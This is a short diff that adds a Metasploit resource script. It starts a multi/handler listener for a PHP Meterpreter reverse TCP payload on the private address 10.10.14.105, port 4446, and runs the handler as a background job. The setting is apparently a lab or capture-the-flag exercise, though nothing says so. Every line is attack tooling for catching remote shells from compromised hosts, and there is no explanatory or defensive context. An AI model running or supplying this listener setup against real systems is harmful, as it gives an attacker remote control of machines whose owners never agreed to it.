@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost 10.10.14.105
+set lport 4446
+exploit -j -z
+jobs
